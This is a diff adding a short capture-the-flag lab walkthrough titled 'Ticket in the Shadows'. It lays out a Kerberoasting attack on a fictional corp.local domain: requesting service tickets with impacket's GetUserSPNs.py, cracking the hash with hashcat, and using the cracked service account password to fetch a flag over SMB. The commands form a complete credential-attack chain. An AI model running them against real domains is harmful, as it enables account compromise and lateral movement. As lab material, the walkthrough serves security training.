@@ -1,0 +1,24 @@
+Side Mission: Ticket in the Shadows
+
+Objective:
+Capture a Kerberos service ticket from a roastable SPN and crack the hash offline.
+
+Steps:
+1. Use impacket's GetUserSPNs.py:
+   GetUserSPNs.py -request corp.local/jane.doe:Password123
+
+2. Output contains:
+   ServicePrincipalName: MSSQLSvc/db.corp.local:1433
+   Hash: $krb5tgs$23$svc_sql$...
+
+3. Save hash and crack using:
+   hashcat -m 13100 spn.hash rockyou.txt --force
+
+4. Cracked password: Winter2023!
+
+5. Access flag:
+   smbclient \\\\DC01\\secure -U svc_sql
+   get flag.txt
+
+Flag:
+CTF{d0m41n_r0yal_br34k}
